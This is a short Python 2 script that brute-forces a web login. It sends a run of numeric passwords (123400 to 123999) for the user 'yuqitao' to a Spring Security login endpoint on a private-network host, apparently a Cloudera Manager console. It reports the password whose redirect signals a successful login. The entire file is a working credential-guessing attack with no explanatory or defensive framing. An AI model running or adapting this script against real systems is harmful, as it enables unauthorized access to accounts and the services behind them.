# -*- coding: utf-8 -*-

import requests
import time

url = 'http://192.168.130.111:7180/j_spring_security_check'

for i in range(123400, 124000):
    p = str(i)
    # print p
    postdata = 'j_username=yuqitao&j_password=' + p + '&returnUrl=&submit='

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': '192.168.130.111:7180',
        'Origin': 'http://192.168.130.111:7180',
        'Referer': 'http://192.168.130.111:7180/cmf/login',
    }

    r = requests.post(url, data=postdata, headers=headers, allow_redirects=False)

    u = str(r.headers['Location'])
    if 'postLogin' in u:
        print u
